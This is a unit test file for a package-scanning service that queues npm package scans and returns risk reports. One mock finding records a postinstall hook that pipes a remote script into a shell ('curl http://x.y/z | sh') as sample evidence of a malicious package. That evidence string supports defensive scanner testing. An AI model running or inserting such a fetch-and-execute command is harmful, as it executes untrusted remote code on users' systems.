import { HttpStatus, NotFoundException } from '@nestjs/common';
import type { PrismaService } from '../../prisma/prisma.service.js';
import type { AuthUser } from '../auth/auth.types.js';
import { ScansService } from './scans.service.js';

const USER: AuthUser = { uid: 'k3F9x2Mq7A', userName: 'apu', role: 'USER' };
const CREATED_AT = new Date('2026-10-28T10:00:00Z');

describe('ScansService', () => {
  let prisma: {
    user: { findUnique: ReturnType<typeof vi.fn> };
    scan: {
      create: ReturnType<typeof vi.fn>;
      findUnique: ReturnType<typeof vi.fn>;
    };
  };
  let scansService: ScansService;

  beforeEach(() => {
    prisma = {
      user: { findUnique: vi.fn() },
      scan: { create: vi.fn(), findUnique: vi.fn() },
    };
    scansService = new ScansService(prisma as unknown as PrismaService);
  });

  describe('createScan', () => {
    const created = {
      uid: 'Ab3dE5gH7j',
      status: 'queued',
      packageName: 'left-pad',
      requestedVersion: '1.3.0',
      createdAt: CREATED_AT,
    };

    it('queues a scan without a user', async () => {
      prisma.scan.create.mockResolvedValue(created);

      const result = await scansService.createScan({
        packageName: 'left-pad',
        version: '1.3.0',
      });

      expect(prisma.user.findUnique).not.toHaveBeenCalled();
      expect(prisma.scan.create.mock.calls[0][0].data).toEqual({
        packageName: 'left-pad',
        requestedVersion: '1.3.0',
        userId: undefined,
      });
      expect(result.status).toBe(HttpStatus.ACCEPTED);
      expect(result.data).toEqual({
        uid: 'Ab3dE5gH7j',
        status: 'queued',
        packageName: 'left-pad',
        version: '1.3.0',
        createdAt: CREATED_AT,
      });
    });

    it('links the scan to the logged-in user', async () => {
      prisma.user.findUnique.mockResolvedValue({ id: 7n });
      prisma.scan.create.mockResolvedValue(created);

      await scansService.createScan({ packageName: 'left-pad' }, USER);

      expect(prisma.user.findUnique.mock.calls[0][0].where).toEqual({
        uid: USER.uid,
      });
      expect(prisma.scan.create.mock.calls[0][0].data.userId).toBe(7n);
    });

    it('returns a null version when none was requested', async () => {
      prisma.scan.create.mockResolvedValue({
        ...created,
        requestedVersion: null,
      });

      const result = await scansService.createScan({ packageName: 'left-pad' });

      expect(result.data.version).toBeNull();
    });
  });

  describe('getScan', () => {
    it('returns the report of a completed scan', async () => {
      prisma.scan.findUnique.mockResolvedValue({
        uid: 'Ab3dE5gH7j',
        status: 'completed',
        packageName: 'left-pad',
        requestedVersion: null,
        riskScore: 82,
        riskLevel: 'high',
        error: null,
        createdAt: CREATED_AT,
        startedAt: CREATED_AT,
        completedAt: CREATED_AT,
        packageVersionInfo: { version: '1.3.0' },
        findings: [
          {
            checkType: 'install_scripts',
            severity: 'high',
            summary: 'postinstall runs a remote shell script',
            evidence: 'curl http://x.y/z | sh',
          },
        ],
      });

      const result = await scansService.getScan('Ab3dE5gH7j');

      expect(result.status).toBe(HttpStatus.OK);
      expect(result.data).toMatchObject({
        uid: 'Ab3dE5gH7j',
        status: 'completed',
        version: '1.3.0',
        riskScore: 82,
        riskLevel: 'high',
        error: null,
      });
      expect(result.data.findings).toHaveLength(1);
    });

    it('falls back to the requested version while the scan is queued', async () => {
      prisma.scan.findUnique.mockResolvedValue({
        uid: 'Ab3dE5gH7j',
        status: 'queued',
        packageName: 'left-pad',
        requestedVersion: '1.3.0',
        riskScore: null,
        riskLevel: null,
        error: null,
        createdAt: CREATED_AT,
        startedAt: null,
        completedAt: null,
        packageVersionInfo: null,
        findings: [],
      });

      const result = await scansService.getScan('Ab3dE5gH7j');

      expect(result.data).toMatchObject({
        version: '1.3.0',
        riskScore: null,
        riskLevel: null,
        findings: [],
        completedAt: null,
      });
    });

    it('throws NotFoundException when the scan does not exist', async () => {
      prisma.scan.findUnique.mockResolvedValue(null);

      await expect(scansService.getScan('missing')).rejects.toThrow(
        NotFoundException,
      );
    });
  });
});
